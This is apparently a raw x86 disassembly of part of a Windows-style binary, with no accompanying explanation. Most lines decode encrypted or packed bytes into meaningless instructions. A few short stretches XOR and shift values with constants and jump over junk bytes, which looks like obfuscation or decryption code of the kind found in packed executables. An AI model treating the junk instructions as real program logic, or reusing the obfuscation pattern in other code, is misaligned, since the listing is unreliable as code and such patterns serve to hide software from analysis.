  40de96:	cmp    edx,DWORD PTR [edi]
  40de98:	dec    edx
  40de99:	xor    BYTE PTR [ecx-0x37c66152],dh
  40de9f:	cs dec ecx
  40dea1:	ins    DWORD PTR es:[edi],dx
  40dea2:	or     bh,dl
  40dea4:	mov    edi,0x980e5a8e
  40dea9:	rol    BYTE PTR [ecx+0x1f],1
  40deac:	xchg   edi,eax
  40dead:	rol    dh,1
  40deaf:	xor    dh,BYTE PTR [ebx]
  40deb1:	pushf  
  40deb2:	sub    bl,BYTE PTR [ebp+0x106ab699]
  40deb8:	push   es
  40deb9:	stc    
  40deba:	dec    eax
  40debb:	stos   BYTE PTR es:[edi],al
  40debc:	cmp    eax,0x73becd3d
  40dec1:	jo     0x40de60
  40dec3:	push   ss
  40dec4:	(bad)  
  40dec5:	dec    edx
  40dec6:	in     al,dx
  40dec7:	fidiv  WORD PTR [ebp-0x665fc130]
  40decd:	stc    
  40dece:	daa    
  40decf:	inc    BYTE PTR [edx+0x1c]
  40ded2:	mov    edi,0x7593c149
  40ded7:	imul   esp,DWORD PTR [ebx+0x646b2303],0xd544f3bb
  40dee1:	sub    al,0x4f
  40dee3:	das    
  40dee4:	int    0xe0
  40dee6:	pop    esi
  40dee7:	int    0x5b
  40dee9:	mov    dl,0xaf
  40deeb:	xlat   BYTE PTR ds:[ebx]
  40deec:	cmp    eax,0xfe09d547
  40def1:	jg     0x40df00
  40def3:	inc    eax
  40def4:	mov    ds:0x5005b79a,al
  40def9:	dec    eax
  40defa:	stos   BYTE PTR es:[edi],al
  40defb:	out    dx,al
  40defc:	ficomp DWORD PTR [esi+0x5bebd665]
  40df02:	(bad)  
  40df03:	fwait
  40df04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df05:	adc    edi,0x79de42c5
  40df0b:	xchg   ecx,eax
  40df0c:	push   ds
  40df0d:	inc    ebp
  40df0e:	or     BYTE PTR [ebp+0x37a88632],bh
  40df14:	loopne 0x40df3b
  40df16:	outs   dx,DWORD PTR ds:[esi]
  40df17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df18:	sti    
  40df19:	mov    eax,edi
  40df1b:	adc    eax,0xb11bb963
  40df20:	ror    BYTE PTR [edx+0x2f],0xc
  40df24:	jecxz  0x40dee8
  40df26:	add    esp,DWORD PTR [ebx+0x6cff3793]
  40df2c:	(bad)  
  40df2d:	jle    0x40df6c
  40df2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df30:	or     eax,0x401971ba
  40df35:	and    BYTE PTR [edx+0x497a7d31],0x68
  40df3c:	out    0xba,al
  40df3e:	call   0x336b:0x7311cfb8
  40df45:	test   BYTE PTR [edx+0x274d5ca5],dl
  40df4b:	je     0x40df28
  40df4d:	mov    al,ds:0x2db8e8fe
  40df53:	push   esp
  40df54:	add    ebx,DWORD PTR [edx-0x737a4d26]
  40df5a:	dec    ecx
  40df5b:	push   ebp
  40df5c:	rol    BYTE PTR [ecx-0x7a8da408],0x47
  40df63:	loopne 0x40df04
  40df65:	dec    esi
  40df66:	cmp    al,0xd2
  40df68:	dec    edx
  40df69:	sub    ebx,DWORD PTR [ebx+0x164f2c01]
  40df6f:	jbe    0x40df11
  40df71:	push   ebx
  40df72:	enter  0x508b,0x7c
  40df76:	imul   BYTE PTR [esi-0x62]
  40df79:	mov    esp,0xc80d5508
  40df7e:	nop
  40df7f:	adc    al,0x86
  40df81:	int    0x8c
  40df83:	and    al,0x86
  40df85:	call   0xd272:0x71dfe3d
  40df8c:	loop   0x40dfb6
  40df8e:	xor    al,0x6c
  40df90:	xchg   ebx,eax
  40df91:	cmp    al,0x7c
  40df93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df94:	je     0x40df6b
  40df96:	pushf  
  40df97:	sub    eax,0x586c12a3
  40df9c:	add    DWORD PTR [edx+0x33],0xf2221f23
  40dfa3:	aad    0x1d
  40dfa5:	mov    esp,esp
  40dfa7:	mov    edx,DWORD PTR [ebp-0x4c]
  40dfaa:	xor    edx,edx
  40dfac:	shl    eax,0x1e
  40dfaf:	mov    ax,dx
  40dfb2:	or     ax,cx
  40dfb5:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfb8:	cmp    WORD PTR [ecx],ax
  40dfbb:	je     0x40eb64
  40dfc1:	mov    eax,DWORD PTR [ebp+0x14]
  40dfc4:	sub    DWORD PTR [ebp-0x4],eax
  40dfc7:	mov    eax,DWORD PTR [esi]
  40dfc9:	mov    ecx,DWORD PTR [esi+0x4]
  40dfcc:	mov    ecx,eax
  40dfce:	jmp    0x40e558
  40dfd3:	push   ebx
  40dfd4:	cli    
  40dfd5:	test   dh,ah
  40dfd7:	fs pop eax
  40dfd9:	pop    ecx
  40dfda:	jb     0x40df93
  40dfdc:	shr    DWORD PTR [esi+ebp*4-0x572b7634],1
  40dfe3:	sub    ch,BYTE PTR [eax+0x43d1616]
  40dfe9:	push   ss
  40dfea:	push   ss
  40dfeb:	loope  0x40e004
  40dfed:	icebp  
  40dfee:	adc    eax,0xb9d4e230
  40dff3:	adc    BYTE PTR [edi],bh
  40dff5:	sahf   
  40dff6:	xchg   ebx,eax
  40dff7:	aam    0xd8
  40dff9:	push   eax
  40dffa:	cmp    DWORD PTR [esp+ebp*8],ecx
  40dffd:	pop    eax
  40dffe:	shl    BYTE PTR [ebx],cl
  40e000:	inc    eax
  40e001:	inc    ecx
  40e002:	enter  0x875,0x31
  40e006:	or     dl,BYTE PTR [ecx+0xed6e4c3]
  40e00c:	fild   DWORD PTR [edx-0xd]
  40e00f:	jmp    0x69ad:0xfd10300e
  40e016:	xor    BYTE PTR [ebp-0x754c0986],ch
  40e01c:	das    
  40e01d:	cmp    ebp,DWORD PTR [ebp+0x6427ff57]
  40e023:	(bad)  
  40e024:	sahf   
  40e025:	loop   0x40e02d
  40e027:	add    edx,esp
  40e029:	ja     0x40e020
  40e02b:	adc    DWORD PTR [esi-0x3d],esp
  40e02e:	fnstenv [esi]
  40e030:	mov    cl,0xe
  40e032:	fcom   DWORD PTR [edi]
  40e034:	repz bound ecx,QWORD PTR [edx+edi*4]
  40e038:	outs   dx,DWORD PTR ds:[esi]
  40e039:	icebp  
  40e03a:	pop    ds
  40e03b:	inc    ecx
  40e03c:	(bad)  
  40e03e:	xchg   edx,eax
  40e03f:	fisttp QWORD PTR [esi+0x26c5874c]
  40e045:	call   0xd03a:0xa75424a9
  40e04c:	inc    ecx
  40e04d:	les    ecx,FWORD PTR ds:0xa0143200
  40e053:	fld    DWORD PTR [ebp-0x14]
  40e056:	pop    esp
  40e057:	jmp    0xeae8b43f
  40e05c:	dec    esp
  40e05d:	xchg   ebx,eax
  40e05e:	xor    al,0x5e
  40e060:	pop    edx
  40e061:	inc    edi
  40e062:	pop    ds
  40e063:	pop    esp
  40e064:	mov    ah,0xe
  40e066:	pop    esp
  40e067:	retf   0x2674
  40e06a:	mov    esp,DWORD PTR [ebx+0x70ea4d16]
  40e070:	sub    dl,bl
  40e072:	xchg   ebx,eax
  40e073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e074:	(bad)  
  40e075:	mov    ah,0x55
  40e077:	lock push esp
  40e079:	mov    eax,ds:0x92f67071
  40e07e:	js     0x40e05d
  40e080:	(bad)  
  40e081:	fidiv  DWORD PTR [esi+ebp*8]
  40e084:	outs   dx,DWORD PTR ds:[esi]
  40e085:	loop   0x40e0c3
  40e087:	outs   dx,BYTE PTR ds:[esi]
  40e088:	enter  0xc92e,0x1c
  40e08c:	inc    esi
  40e08d:	pop    ebp
  40e08e:	scas   eax,DWORD PTR es:[edi]
  40e08f:	popa   
  40e090:	mov    edx,DWORD PTR [ebp-0x7dc36e9f]
  40e096:	ds dec ebp
  40e098:	cmp    al,0xb4
  40e09a:	ss xchg esi,edx
  40e09d:	sub    BYTE PTR [esi+0x49],0x56
  40e0a1:	inc    esp
  40e0a2:	xchg   bl,bl
  40e0a4:	sbb    eax,0xba0d407e
  40e0a9:	pop    esp
  40e0aa:	sub    BYTE PTR [edx-0x37b6508e],ah
  40e0b0:	shr    DWORD PTR [edx+ebp*8-0x14],cl
  40e0b4:	pop    DWORD PTR [edi+0xa1a1699]
  40e0ba:	retf   0xf6fc
  40e0bd:	push   ebp
  40e0be:	sbb    edi,DWORD PTR [edx+0x1d3c8b98]
  40e0c4:	xor    eax,0xf0ac619f
  40e0c9:	sbb    al,0xba
  40e0cb:	xor    BYTE PTR [ecx],dl
  40e0cd:	inc    esi
  40e0ce:	jmp    DWORD PTR [eax+ebx*8-0x26b2cd2f]
  40e0d5:	int3   
  40e0d6:	mov    dl,0x70
  40e0d8:	fiadd  WORD PTR [ebp-0x66f24f5a]
  40e0de:	push   ecx
  40e0df:	test   edx,0x31bf6ae2
  40e0e5:	stos   DWORD PTR es:[edi],eax
  40e0e6:	out    0x1a,al
  40e0e8:	pop    ecx
  40e0e9:	jnp    0x40e0d8
  40e0eb:	retf   
  40e0ec:	pop    esi
  40e0ed:	mov    ds:0xcc9ce7e2,eax
  40e0f2:	cmp    DWORD PTR ds:0x7d263a66,esp
  40e0f8:	loopne 0x40e16a
  40e0fa:	mov    eax,0x390197fd
  40e0ff:	mov    ecx,DWORD PTR [eax+ecx*4]
  40e102:	loopne 0x40e10a
  40e104:	out    0x4f,al
  40e106:	xchg   esi,eax
  40e107:	mov    ds:0x2bad7351,eax
  40e10c:	inc    ebp
  40e10d:	adc    eax,0xf5f7f22e
  40e112:	or     al,0xc4
  40e114:	imul   ecx,ecx,0x3f
  40e117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e118:	fcomp  DWORD PTR [ecx-0x17]
  40e11b:	and    edi,esp
  40e11d:	fs xor al,0x15
  40e120:	lods   al,BYTE PTR ds:[esi]
  40e121:	aas    
  40e122:	adc    eax,0xb56f08bb
  40e127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e128:	shl    DWORD PTR [edx+esi*4+0x45],0xf4
  40e12d:	pop    esi
  40e12e:	or     DWORD PTR [edi-0x406d36e],edx
  40e134:	mov    ecx,0x286df437
  40e139:	push   esi
  40e13a:	test   eax,0xf4fe028
  40e13f:	cli    
  40e140:	ins    DWORD PTR es:[edi],dx
  40e141:	xchg   edx,eax
  40e142:	fucomp st(0)
  40e144:	cdq    
  40e145:	ins    DWORD PTR es:[edi],dx
  40e146:	lahf   
  40e147:	rcr    BYTE PTR ds:0x48997dc4,cl
  40e14d:	ds and dl,0x98
  40e151:	mov    WORD PTR [ecx],gs
  40e153:	loop   0x40e0e5
  40e155:	pop    esi
  40e156:	repnz mov al,ds:0x98a1afa6
  40e15c:	imul   eax,DWORD PTR [esi+0x3c047c88],0x11a79a4
  40e166:	mov    al,ds:0xcc7eabe8
  40e16b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e16c:	test   al,0x50
  40e16e:	push   ebp
  40e16f:	mov    WORD PTR [ebx],fs
  40e171:	or     eax,ebx
  40e173:	push   es
  40e174:	ja     0x40e12d
  40e176:	jbe    0x40e1d3
  40e178:	stc    
  40e179:	enter  0x6681,0x68
  40e17d:	mov    dl,0x7b
  40e17f:	fsub   QWORD PTR [esi+ebp*1-0x17]
  40e183:	(bad)  
  40e184:	mov    bl,0x46
  40e186:	out    0x3c,eax
  40e188:	xchg   esi,eax
  40e189:	pushf  
  40e18a:	in     eax,0xd2
  40e18c:	sub    eax,0x880807b2
  40e191:	sbb    al,BYTE PTR [edx-0x136a9055]
  40e197:	add    BYTE PTR [esi],0x0
  40e19a:	dec    ecx
  40e19b:	add    al,0x4d
  40e19d:	dec    esp
  40e19e:	add    eax,0x246fdb61
  40e1a3:	fwait
  40e1a4:	jmp    0x8172deae
  40e1a9:	aas    
  40e1aa:	add    DWORD PTR [edi+0x62],edi
  40e1ad:	xchg   DWORD PTR [ecx+0x3b],eax
  40e1b0:	mov    BYTE PTR [esi],ah
  40e1b2:	mov    esi,0x226d47cf
  40e1b7:	lods   eax,DWORD PTR ds:[esi]
  40e1b8:	mov    ah,0xe6
  40e1ba:	mov    esp,0x76ea3df9
  40e1bf:	aas    
  40e1c0:	loope  0x40e1ac
  40e1c2:	nop
  40e1c3:	mov    ds:0xf94e9d13,eax
  40e1c8:	iret   
  40e1c9:	push   ecx
  40e1ca:	shl    DWORD PTR [ebp-0x24df2c5],cl
  40e1d0:	pop    es
  40e1d1:	(bad)  
  40e1d2:	data16 or dl,BYTE PTR [esi-0x280128a8]
  40e1d9:	fidivr WORD PTR [eax+0x2c]
  40e1dc:	nop
  40e1dd:	scas   eax,DWORD PTR es:[edi]
  40e1de:	dec    edi
  40e1df:	and    DWORD PTR [ecx+0x2b446f19],eax
  40e1e5:	iret   
  40e1e6:	jae    0x40e23c
  40e1e8:	lods   eax,DWORD PTR ds:[esi]
  40e1e9:	in     eax,dx
  40e1ea:	ds inc esp
  40e1ec:	sub    edi,DWORD PTR [eax+0x4c0745bb]
  40e1f2:	lods   eax,DWORD PTR ds:[esi]
  40e1f3:	fs add al,0xb5
  40e1f6:	push   0x57
  40e1f8:	cli    
  40e1f9:	imul   BYTE PTR [ebx+0x62cb23e4]
  40e1ff:	inc    ecx
  40e200:	aam    0x90
  40e202:	ins    BYTE PTR es:[edi],dx
  40e203:	cmp    ebp,esp
  40e205:	jp     0x40e1ca
  40e207:	out    0x46,al
  40e209:	and    BYTE PTR [eiz*1+0x7e4fa5ec],al
  40e210:	pop    edi
  40e211:	adc    al,0x16
  40e213:	test   BYTE PTR [edx+0x78],bh
  40e216:	call   0x82ceb053
  40e21b:	push   0xbb6c05a3
  40e220:	push   edi
  40e221:	dec    edi
  40e222:	pop    esi
  40e223:	mov    eax,ds:0x9a2c5d4c
  40e228:	cli    
  40e229:	xchg   esi,eax
  40e22a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e22b:	pushf  
  40e22c:	scas   eax,DWORD PTR es:[edi]
  40e22d:	pop    edx
  40e22e:	pop    ebx
  40e22f:	bound  eax,QWORD PTR [edi+ebp*1-0x27892715]
  40e236:	xchg   edx,eax
  40e237:	sub    ebp,DWORD PTR [ecx+ebx*2+0x20]
  40e23b:	sub    eax,ecx
  40e23d:	sub    DWORD PTR [edx],edi
  40e23f:	mov    al,ds:0x555057c2
  40e244:	cmp    ecx,eax
  40e246:	or     BYTE PTR [eax-0x38],dh
  40e249:	mov    ebp,0x5ec0c690
  40e24e:	add    edx,DWORD PTR [ebp-0x64]
  40e251:	int    0x32
  40e253:	es je  0x40e2c4
  40e256:	dec    ebp
  40e257:	xor    ch,BYTE PTR [esi]
  40e259:	leave  
  40e25a:	inc    eax
  40e25b:	jmp    0xd61a:0x8528c9e4
  40e262:	sbb    esi,esi
  40e264:	pop    ds
  40e265:	(bad)  
  40e266:	and    eax,esp
  40e268:	mov    dh,0x16
  40e26a:	mov    dh,0xb3
  40e26c:	aas    
  40e26d:	dec    esi
  40e26e:	gs ret 
  40e270:	out    0x7f,eax
  40e272:	cld    
  40e273:	mov    ?,WORD PTR [ecx+edi*8]
  40e276:	(bad)  
  40e277:	loopne 0x40e28d
  40e279:	xor    BYTE PTR [eax+0x5467dc4d],bh
  40e27f:	rcr    edi,cl
  40e281:	mov    ch,0xd
  40e283:	xchg   ebx,eax
  40e284:	jne    0x40e246
  40e286:	inc    esp
  40e287:	and    BYTE PTR [ecx-0x628c0d94],dh
  40e28d:	popa   
  40e28e:	add    DWORD PTR [edx+ebp*4+0x12b32dc0],esi
  40e295:	mov    edx,0x9e37d614
  40e29a:	adc    ebp,edx
  40e29c:	push   0xffffffbf
  40e29e:	push   ebp
  40e29f:	pop    ss
  40e2a0:	loope  0x40e296
  40e2a2:	test   eax,0x7514d233
  40e2a7:	sbb    DWORD PTR [esi+0x359d0138],ecx
  40e2ad:	stos   DWORD PTR es:[edi],eax
  40e2ae:	sbb    esp,DWORD PTR [esi-0x77c79aaa]
  40e2b4:	cmp    BYTE PTR [ecx+0x6245a9ea],bh
  40e2ba:	adc    eax,0x8f018566
  40e2bf:	inc    esp
  40e2c0:	lea    eax,[eax-0x7159c80f]
  40e2c6:	push   ds
  40e2c7:	call   0x14d462aa
  40e2cc:	ffree  st(1)
  40e2ce:	ins    DWORD PTR es:[edi],dx
  40e2cf:	inc    esi
  40e2d0:	imul   esp,DWORD PTR [edx],0x88cd7fbc
  40e2d6:	inc    esp
  40e2d7:	stos   DWORD PTR es:[edi],eax
  40e2d8:	xor    DWORD PTR [edx],0x1f8e0d48
  40e2de:	inc    esi
  40e2df:	jnp    0x40e2ea
  40e2e1:	jle    0x40e35f
  40e2e3:	xchg   esp,eax
  40e2e4:	pop    edi
  40e2e5:	xchg   esi,eax
  40e2e6:	lods   eax,DWORD PTR ds:[esi]
  40e2e7:	sub    eax,0x2fa978cf
  40e2ec:	and    ch,BYTE PTR [esi+0x24837f11]
  40e2f2:	cmp    al,0x5f
  40e2f4:	and    BYTE PTR [esi],ah
  40e2f6:	inc    ebx
  40e2f7:	jb     0x40e35a
  40e2f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2fa:	out    dx,al
  40e2fb:	add    al,0xcb
  40e2fd:	and    BYTE PTR [edi],dl
  40e2ff:	out    0x80,eax
  40e301:	and    ebx,esi
  40e303:	add    DWORD PTR [ecx],eax
  40e305:	popa   
  40e306:	and    al,0x70
  40e308:	cwde   
  40e309:	jecxz  0x40e2fd
  40e30b:	mov    edx,0xcd722826
  40e310:	mov    esi,0x528c050b
  40e315:	pop    ebp
  40e316:	rcr    DWORD PTR [edi+0x45],cl
  40e319:	mov    esi,0x8a3ba411
  40e31e:	dec    ecx
  40e31f:	and    BYTE PTR [ebx+eiz*8+0xb],0x42
  40e324:	fs jge 0x40e36a
  40e327:	cmc    
  40e328:	cmp    al,0xef
  40e32a:	inc    eax
  40e32b:	(bad)  
  40e32c:	iret   
  40e32d:	push   ds
  40e32e:	add    al,0xde
  40e330:	outs   dx,BYTE PTR ds:[esi]
  40e331:	mov    dl,0x6f
  40e333:	push   es
  40e334:	call   DWORD PTR [edx-0x71]
  40e337:	fmul   DWORD PTR [edi+0x76070a5c]
  40e33d:	das    
  40e33e:	and    ebx,ebp
  40e340:	out    0x11,eax
  40e342:	into   
  40e343:	mov    ebp,?
  40e345:	inc    edi
  40e346:	addr16 jl 0x40e3b1
  40e349:	sbb    DWORD PTR [edx+0x61c21fca],ebx
  40e34f:	fsubr  DWORD PTR [edi+0x1eda95b0]
  40e355:	fisub  WORD PTR ds:0xe2ce4f61
  40e35b:	mov    bl,0xe5
  40e35d:	push   ds
  40e35e:	dec    ecx
  40e35f:	lahf   
  40e360:	ret    
  40e361:	inc    ebx
  40e362:	xlat   BYTE PTR ds:[ebx]
  40e363:	popa   
  40e364:	pop    ebp
  40e365:	loop   0x40e358
  40e367:	fidivr WORD PTR [ebp+0x4f]
  40e36a:	pop    ebx
  40e36b:	jl     0x40e3d0
  40e36d:	xchg   edi,eax
  40e36e:	(bad)  
  40e36f:	leave  
  40e370:	mov    ecx,0x6ab4a129
  40e375:	pop    es
  40e376:	int3   
  40e377:	in     al,dx
  40e378:	xchg   edx,eax
  40e379:	pop    ss
  40e37a:	jb     0x40e33e
  40e37c:	pop    esi
  40e37d:	fwait
  40e37e:	xor    edi,ebp
  40e380:	jecxz  0x40e3be
  40e382:	xchg   BYTE PTR [ebx],cl
  40e384:	test   BYTE PTR [esp+eiz*4],ah
  40e387:	xlat   BYTE PTR ds:[ebx]
  40e388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e389:	mov    edx,0x5932cac1
  40e38e:	(bad)
  40e391:	inc    edi
  40e392:	ss mov bh,0x92
  40e395:	pop    ss
  40e396:	aam    0x7e
  40e398:	icebp  
  40e399:	mov    esi,?
  40e39b:	mov    ebp,0xd40fd1d0
  40e3a0:	dec    edx
  40e3a1:	mov    al,ds:0xc06d2433
  40e3a6:	ss stos DWORD PTR es:[edi],eax
  40e3a8:	inc    ecx
  40e3a9:	or     DWORD PTR [ebp+0x74],esp
  40e3ac:	data16 xlat BYTE PTR ds:[ebx]
  40e3ae:	stos   BYTE PTR es:[edi],al
  40e3af:	xor    edi,DWORD PTR [esi+eiz*2]
  40e3b2:	mov    ecx,0x4b14f5ef
  40e3b7:	aas    
  40e3b8:	aam    0x28
  40e3ba:	push   cs
  40e3bb:	pop    es
  40e3bc:	gs cld 
  40e3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bf:	lods   eax,DWORD PTR ds:[esi]
  40e3c0:	sub    al,0x40
  40e3c2:	addr16 jg 0x40e3dd
  40e3c5:	dec    esp
  40e3c6:	rol    BYTE PTR [edx+0x25cf760e],1
  40e3cc:	or     BYTE PTR [ecx+0x5558a5c9],ch
  40e3d2:	jae    0x40e425
  40e3d4:	repnz push esp
  40e3d6:	inc    edx
  40e3d7:	rcl    DWORD PTR ds:[ebx-0x51],0x3d
  40e3dc:	pop    ds
  40e3dd:	test   DWORD PTR [eax+0x2cf7251d],ecx
  40e3e3:	shl    BYTE PTR [edi-0x36],1
  40e3e6:	daa    
  40e3e7:	dec    eax
  40e3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e9:	inc    ecx
  40e3ea:	repz pop ebp
  40e3ec:	es dec esi
  40e3ee:	fild   QWORD PTR [edx]
  40e3f0:	std    
  40e3f1:	in     eax,0x5e
  40e3f3:	ficomp DWORD PTR [ebp+0x68ca46bb]
  40e3f9:	out    0x69,al
  40e3fb:	sub    DWORD PTR [esi-0x27df4a0e],edi
  40e401:	sub    edx,DWORD PTR [ebx-0x58a28d91]
  40e407:	rol    ch,cl
  40e409:	mov    al,ds:0x1348b3e7
  40e40e:	add    edi,DWORD PTR [ebp+edx*2-0x5c]
  40e412:	leave  
  40e413:	retf   0x9081
  40e416:	or     al,dh
  40e418:	cmp    BYTE PTR [ebx+0x7a67a34b],0xbe
  40e41f:	cdq    
  40e420:	cmp    dh,BYTE PTR [eax+0x49]
  40e423:	jbe    0x40e45d
  40e425:	sub    dl,BYTE PTR [ebp+0x48]
  40e428:	mov    ds:0xd1e08096,al
  40e42d:	fnstsw WORD PTR [edx-0x5a]
  40e430:	ret    0x4ad3
  40e433:	addr16 jmp 0x1f0c:0x4897
  40e43a:	imul   BYTE PTR [eax]
  40e43c:	cmp    DWORD PTR [ebx-0x4f],0x995c177e
  40e443:	sub    eax,0xaefd323a
  40e448:	bound  ebp,QWORD PTR [esi+0x468b9306]
  40e44e:	xor    ah,BYTE PTR [ebx-0x49]
  40e451:	jge    0x40e48f
  40e453:	push   0x8ac182c5
  40e458:	adc    al,0x4d
  40e45a:	sub    DWORD PTR [edx-0x60964ec8],edx
  40e460:	dec    esi
  40e461:	mov    BYTE PTR [edx],ch
  40e463:	xchg   edx,eax
  40e464:	push   0x5
  40e466:	mov    ebp,0xae810995
  40e46b:	mov    edi,0xfed5fea1
  40e470:	xchg   ebx,eax
  40e471:	sti    
  40e472:	mov    eax,0xc2818486
  40e477:	fprem1 
  40e479:	hlt    
  40e47a:	test   ebp,eax
  40e47c:	fdiv   QWORD PTR [esi-0x3f]
  40e47f:	(bad)  
  40e480:	and    DWORD PTR [ebp+edx*4-0x3d03f08b],ebx
  40e487:	inc    ebp
  40e488:	or     DWORD PTR [ecx],edx
  40e48a:	sub    ecx,esp
  40e48c:	and    DWORD PTR [ebp+0x70],0x6a
  40e490:	mov    cl,0x72
  40e492:	(bad)  
  40e493:	in     al,dx
  40e494:	mov    esp,0x1e3fcb4f
  40e499:	inc    edx
  40e49a:	adc    dh,BYTE PTR [ecx+0x69]
  40e49d:	jg     0x40e4b6
  40e49f:	mov    bh,bl
  40e4a1:	das    
  40e4a2:	pushf  
  40e4a3:	push   es
  40e4a4:	push   0xfffffff1
  40e4a6:	adc    eax,0xfd7deaaa
  40e4ab:	mov    dh,0x28
  40e4ad:	enter  0x98f2,0xca
  40e4b1:	xchg   BYTE PTR [ecx+0x51],ah
  40e4b4:	ins    BYTE PTR es:[edi],dx
  40e4b5:	call   0x8462:0xf5b464a4
  40e4bc:	jmp    0x9490d7b4
  40e4c1:	cdq    
  40e4c2:	test   ebp,ebp
  40e4c4:	sub    al,0x4f
  40e4c6:	shr    BYTE PTR [eax],0xac
  40e4c9:	xchg   BYTE PTR [ebp-0x253606aa],bh
  40e4cf:	pop    es
  40e4d0:	mov    esi,0x7475d63d
  40e4d5:	clc    
  40e4d6:	pop    ebx
  40e4d7:	push   ecx
  40e4d8:	dec    edx
  40e4d9:	dec    esi
  40e4da:	push   esi
  40e4db:	mov    al,ds:0xd27d4616
  40e4e0:	push   eax
  40e4e1:	neg    DWORD PTR [ecx]
  40e4e3:	xchg   ebx,eax
  40e4e4:	pop    edx
  40e4e5:	or     BYTE PTR [edx-0x788e380],0x3f
  40e4ec:	add    DWORD PTR [ebx+0x41bb6d4e],ecx
  40e4f2:	and    eax,0xe2ec8dfe
  40e4f7:	jns    0x40e555
  40e4f9:	shl    ch,1
  40e4fb:	xchg   esp,eax
  40e4fc:	mov    al,0xbd
  40e4fe:	push   esp
  40e4ff:	fwait
  40e500:	pop    ss
  40e501:	xchg   edx,eax
  40e502:	mov    eax,ds:0xa59e6e49
  40e507:	sub    DWORD PTR [ebx],ebx
  40e509:	mov    eax,0x3e976bb
  40e50e:	cs test esi,edx
  40e511:	jnp    0x40e4b1
  40e513:	sbb    esi,DWORD PTR [edx+0x37]
  40e516:	inc    ecx
  40e517:	xchg   bh,cl
  40e519:	xor    dh,BYTE PTR [edx-0x6e]
  40e51c:	call   0x1cf2:0x1b26c4e6
  40e523:	mov    dh,0x6
  40e525:	inc    edx
  40e526:	xchg   ebx,eax
  40e527:	push   ebp
  40e528:	das    
  40e529:	jmp    0xc1c9:0x8f46e7c1
  40e530:	repnz push 0xa9672836
  40e536:	mov    dh,0xc6
  40e538:	ret    0x77c0
  40e53b:	in     eax,0xc4
  40e53d:	jb     0x40e502
  40e53f:	push   esp
  40e540:	out    0xf4,al
  40e542:	add    DWORD PTR [edi],edx
  40e544:	or     BYTE PTR [eax+0x11],ch
  40e547:	in     eax,0xa2
  40e549:	jno    0x40e519
  40e54b:	(bad)  
  40e54d:	mov    ebp,0x39bc40b8
  40e552:	sub    DWORD PTR [ecx+0x357949a8],edx
  40e558:	shl    ecx,0x1e
  40e55b:	xor    ecx,0xc0000000
  40e561:	mov    DWORD PTR [ebp-0x64],ecx
  40e564:	mov    ecx,DWORD PTR [esi]
  40e566:	mov    edx,DWORD PTR [esi+0x4]
  40e569:	xor    edx,0x9c0a89d8
  40e56f:	xor    ecx,0xba699573
  40e575:	shrd   ecx,edx,0x2
  40e579:	shr    edx,0x2
  40e57c:	or     edx,DWORD PTR [ebp-0x64]
  40e57f:	xor    eax,eax
  40e581:	or     ecx,eax
  40e583:	jmp    0x40eb0d
  40e588:	sahf   
  40e589:	or     ah,al
  40e58b:	jp     0x40e525
  40e58d:	cmp    bl,BYTE PTR [eax]
  40e58f:	sub    DWORD PTR [ebx+0x4a],ebp
  40e592:	mov    WORD PTR [esi-0x69],gs
  40e595:	add    esi,DWORD PTR [edx+0x16946172]
  40e59b:	push   ss
  40e59c:	cmp    eax,0xd2161604
  40e5a1:	or     DWORD PTR [edi-0x24],ebx
  40e5a4:	test   BYTE PTR ds:0xca40263,dl
  40e5aa:	add    ebx,0x69
  40e5ad:	fcomi  st,st(1)
  40e5af:	in     al,dx
  40e5b0:	mov    ds:0x521f0105,al
  40e5b5:	mov    esp,eax
  40e5b7:	add    DWORD PTR [edi],esp
  40e5b9:	in     al,0x70
  40e5bb:	loop   0x40e5b0
  40e5bd:	hlt    
  40e5be:	dec    edx
  40e5bf:	cmp    ebp,DWORD PTR [ecx-0x6d]
  40e5c2:	out    dx,al
  40e5c3:	mov    edx,0x31ecef24
  40e5c8:	pop    ecx
  40e5c9:	sti    
  40e5ca:	pop    eax
  40e5cb:	dec    ebp
  40e5cc:	pop    es
  40e5cd:	add    eax,0x8fcfd62d
  40e5d2:	(bad)
  40e5d5:	xor    ch,dl
  40e5d7:	shr    BYTE PTR [esi+0x1515d203],1
  40e5dd:	in     al,0x7a
  40e5df:	mov    WORD PTR [eax],cs
  40e5e1:	in     al,dx
  40e5e2:	jge    0x40e652
  40e5e4:	fiadd  DWORD PTR [edi]
  40e5e6:	aaa    
  40e5e7:	mov    ebx,?
  40e5e9:	(bad)
  40e5ec:	addr16 mov esi,?
  40e5ef:	sbb    DWORD PTR [ecx],ecx
  40e5f1:	lahf   
  40e5f2:	outs   dx,BYTE PTR ds:[esi]
  40e5f3:	pop    ebp
  40e5f4:	mov    BYTE PTR [esp+eax*1+0x61],dl
  40e5f8:	pop    ds
  40e5f9:	cwde   
  40e5fa:	les    edi,FWORD PTR [ebx+0x4f]
  40e5fd:	test   eax,0x316a65ad
  40e602:	hlt    
  40e603:	jae    0x40e653
  40e605:	inc    BYTE PTR [edx+0x495bbb18]
  40e60b:	adc    al,0x52
  40e60d:	pop    ebx
  40e60e:	dec    eax
  40e60f:	pop    DWORD PTR [eax]
  40e611:	cmp    BYTE PTR [esi+0x23],bl
  40e614:	mov    ecx,0x4b593aa9
  40e619:	in     eax,0x25
  40e61b:	popa   
  40e61c:	jecxz  0x40e63e
  40e61e:	fcom   st(2)
  40e620:	sub    BYTE PTR [ecx-0x18],ch
  40e623:	jno    0x40e685
  40e625:	in     eax,dx
  40e626:	adc    dl,BYTE PTR [edi-0x30]
  40e629:	add    dl,dl
  40e62b:	xchg   ecx,eax
  40e62c:	jl     0x40e6ac
  40e62e:	xor    ebx,DWORD PTR [ebp+esi*8+0x40]
  40e632:	cmp    BYTE PTR [edx],dl
  40e634:	inc    esi
